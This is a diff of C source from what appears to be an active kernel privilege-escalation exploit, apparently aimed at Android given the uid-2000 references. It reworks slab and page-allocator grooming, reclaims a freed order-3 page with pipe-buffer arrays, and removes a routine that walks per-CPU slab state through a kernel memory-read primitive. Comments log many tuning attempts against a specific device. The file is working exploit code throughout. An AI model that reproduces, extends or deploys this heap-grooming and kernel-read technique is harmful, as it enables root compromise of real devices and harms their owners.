@@ -336,22 +336,49 @@ void free_pipe_object(int pipefd[2]) {
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
-  pin_to_core(CORE);
+  int group_fds[ORDER3_SIZE / MM_STRUCT_SZ];
+  uintptr_t base = 0;
+  int dummy_sv[2];
+  struct controlled_mm_drain_state st = {
+      .s2 = -1,
+  };
 
-  /* No mm-group collect/drain any more. The parent locates this allocation's
-   * slab through the CFI read primitive (find_active_pipe_slab_page) instead
-   * of hoping the kmalloc-cg-2k cache takes a fresh slab from a page freed
-   * to the buddy (try36-43: the cache never did). The rings only have to
-   * leave the cache's per-CPU active slab partially filled: 239 arrays =
-   * 14 full 16-object slabs + one holding 15/16, so cpu_slab->slab is that
-   * partial slab. Never allocate a multiple of 16 here: SLUB would move the
-   * active slab off the full one and the located page would hold no rings. */
-  for (size_t i = 0; i + 1 < PIPE_RECLAIM; i++) {
+  pin_to_core(CORE);
+  if (!collect_controlled_mm_group((size_t)sysconf(_SC_NPROCESSORS_ONLN),
+                                   &base, group_fds)) {
+    return 0;
+  }
+  pr_info("pipe controlled page base=%016zx\n", base);
+
+  /* Device-proven free order (util.c prepare_controlled_kernel_page): the
+   * drain allocates S918_TRIGGER_SLABS*batch trigger memfds, closes 31 of the
+   * 32 owned mm fds, closes one trigger per trigger slab to create partial-slab
+   * pressure, then closes the last owned fd so SLUB discards the emptied slab
+   * instead of leaving it frozen on the per-CPU list where it was reused with
+   * inuse=32 obj=32 frozen=1. The last close frees the order-3 page intact to
+   * the pcp list of CORE, and the ring allocations run next on that same core
+   * (the drain and this thread stay pinned) so the fresh kmalloc-cgroup-2k
+   * slab takes the whole order-3 page directly for its 16 objects.
+   * No intermediate owner is used for the pipe page: the 16-send skb burst
+   * split the freed order-3 block into separate free order-0 pages (idx 2..7
+   * at gate time), leaving nothing an order-3 slab could claim. The drain's
+   * held trigger objects are released only after the ring allocations: freeing
+   * them first would hand ~24 extra slabs to the buddy and the rings would
+   * take those instead of the freed page. */
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, dummy_sv));
+  if (!drain_controlled_mm_group(group_fds, &st, dummy_sv)) {
+    release_controlled_mm_drain(&st);
+    return 0;
+  }
+
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
       pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
+      release_controlled_mm_drain(&st);
       return 0;
     }
   }
+  release_controlled_mm_drain(&st);
 
   /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
    * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
@@ -362,11 +389,11 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
    * drain resize (try16 [pipefix]: probe16 and probe3 EPERM at
    * this-process-pipe-slots=960), so a drain growth is a pure budget spend
    * with no surviving benefit. Only the reclaim/oracle rings resize — they
-   * request 32 slots and the 9db6c33 floor-26 cap is the safety net that
-   * keeps the ring array in the kmalloc-2k bucket (26 x 0x28 = 1040 B) when
-   * any other uid-2000 pipe pages are already charged. 239 grown rings are
-   * 239 x 26 = 6,214 slot-units, plus the 480 slot-units of never-grown
-   * drain pipes = 6,694 <= 8,192. Hold residue (the sleeping prepare child
+   * request 32 slots (960 + 240x30 = 8,160 <= 8,192 on a clean boot) and
+   * the 9db6c33 floor-26 cap is the safety net that keeps the ring array
+   * in the kmalloc-2k bucket (26 x 0x28 = 1040 B) when any other uid-2000
+   * pipe pages are already charged, for a worst-case pipeline total of
+   * 6,720 slot-units <= 8,192. Hold residue (the sleeping prepare child
    * and the exit fork-hold keep ~496 slot-units of failed-attempt pipes
    * alive) accumulates per failed attempt on a boot — that is what pushed
    * every growth past L on boot ffffff80022f2e38 after the first
@@ -375,14 +402,15 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     pipe_budget_plan_logged = 1;
     pr_info("[pipefix] plan drain=%zu×%zu reclaim=%zu×%zu total=%zu "
             "(budget model L=8192)\n",
-            (size_t)PIPE_DRAIN, (size_t)2, (size_t)(PIPE_RECLAIM - 1),
+            (size_t)PIPE_DRAIN, (size_t)2, (size_t)PIPE_RECLAIM,
             (size_t)P0_PIPE_RING_MIN_SLOTS,
             (size_t)PIPE_DRAIN * 2 +
-                (size_t)(PIPE_RECLAIM - 1) * P0_PIPE_RING_MIN_SLOTS);
+                (size_t)PIPE_RECLAIM * P0_PIPE_RING_MIN_SLOTS);
   }
 
-  pr_info("pipe rings=%d active-partial\n", (int)(PIPE_RECLAIM - 1));
-  return 0;
+  pr_info("pipe controlled page base=%016zx freed=%d rings=%d\n", base,
+          (int)(ORDER3_SIZE / MM_STRUCT_SZ), (int)PIPE_RECLAIM);
+  return base;
 }
 
 /* ================= exit-path protection (fixwave 2026-10) =================
@@ -671,66 +699,6 @@ uintptr_t page_to_direct(uintptr_t page) {
 
 uintptr_t pipe_buf_ops_addr(void) {
   return text_addr(ANON_PIPE_BUF_OPS);
-}
-
-/* Locate the kmalloc-cg-2k slab that holds the pipe-buffer arrays the
- * sleeping prepare child just allocated, using the CFI read primitive:
- *   cs   = __per_cpu_offset[CORE] + cache->cpu_slab   (this_cpu_ptr)
- *   slab = cs->slab                                    (struct slab*, vmemmap)
- *   page = page_to_direct(slab)
- * The child is pinned to CORE and leaves 239 arrays allocated, so cs->slab
- * is the last, partially filled slab (15/16 objects) of that cache. */
-uintptr_t find_active_pipe_slab_page(int fd) {
-  uint64_t cache = kmalloc_pipe_cache;
-  uint64_t percpu;
-  uint64_t cpu_slab;
-  uint64_t slab;
-  uint64_t counters;
-  uintptr_t page;
-  int ops_hit = 0;
-
-  if (!cache) {
-    cache = kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
-  }
-  percpu = kernel_read64(fd, data_addr(PER_CPU_OFFSET) + (uint64_t)CORE * 8);
-  cpu_slab = cache ? kernel_read64(fd, cache + KMEM_CACHE_CPU_SLAB_OFF) : 0;
-  slab = (percpu && cpu_slab)
-             ? kernel_read64(
-                   fd, percpu + cpu_slab + KMEM_CACHE_CPU_ACTIVE_OFF)
-             : 0;
-  if (!cache || !percpu || !cpu_slab || slab < VMEMMAP_START ||
-      slab >= VMEMMAP_END) {
-    pr_warning("pipe active slab miss cache=%016zx pcpu=%016zx cs=%016zx "
-               "slab=%016zx\n", cache, percpu, cpu_slab, slab);
-    return 0;
-  }
-
-  page = page_to_direct((uintptr_t)slab);
-  counters = kernel_read64(fd, (uintptr_t)slab + 0x28);
-  for (size_t i = 0; i < PIPE_OBJS_PER_SLAB; i++) {
-    if (kernel_read64(fd, page + i * PIPE_OBJECT_SIZE + 0x10) ==
-        pipe_buf_ops_addr()) {
-      ops_hit = 1;
-      break;
-    }
-  }
-  /* The arrays come from kcalloc in alloc_pipe_info, so ops is 0 until the
-   * parent's first anon write; ops_hit stays diagnostic there. The cache
-   * identity and the 16-object geometry carry the check. */
-  if (!is_direct_ptr(page) ||
-      kernel_read64(fd, (uintptr_t)slab + STRUCT_SLAB_CACHE_OFF) != cache ||
-      (unsigned)((counters >> 16) & 0x7fff) != PIPE_OBJS_PER_SLAB) {
-    pr_warning("pipe active slab reject page=%016zx cache=%016zx ops=%d "
-               "counters=%016llx\n", page, cache, ops_hit,
-               (unsigned long long)counters);
-    return 0;
-  }
-
-  pr_info("pipe active slab page=%016zx cache=%016zx ops=%d inuse=%u obj=%u "
-          "frozen=%u\n", page, cache, ops_hit, (unsigned)(counters & 0xffff),
-          (unsigned)((counters >> 16) & 0x7fff),
-          (unsigned)((counters >> 31) & 1));
-  return page;
 }
 
 int pipe_cache_matches(uint64_t slab_cache) {
